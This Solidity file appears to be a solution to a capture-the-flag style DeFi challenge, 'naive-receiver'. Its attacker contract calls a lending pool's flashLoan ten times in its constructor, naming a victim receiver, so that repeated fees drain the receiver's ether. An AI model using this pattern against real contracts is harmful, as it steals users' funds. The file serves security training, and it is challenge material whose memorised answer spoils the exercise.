// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.4;

import "src/naive-receiver/FlashLoanReceiver.sol";
import "src/naive-receiver/NaiveReceiverLenderPool.sol";
import "forge-std/Test.sol";


/// https://book.getfoundry.sh/forge/writing-tests
contract AttackerContract is Test  {

    uint256 internal constant ETHER_IN_RECEIVER = 10 ether;

    address payable internal flashLoanReceiverAddr;
    NaiveReceiverLenderPool internal naiveReceiverLenderPool;
  
    constructor(NaiveReceiverLenderPool lender, address payable receiverAddr) {
        naiveReceiverLenderPool = lender;
        flashLoanReceiverAddr = receiverAddr;
        for (uint i = 0; i < 10; i++)
        {
            naiveReceiverLenderPool.flashLoan(flashLoanReceiverAddr, 0);
        }
    }
   
}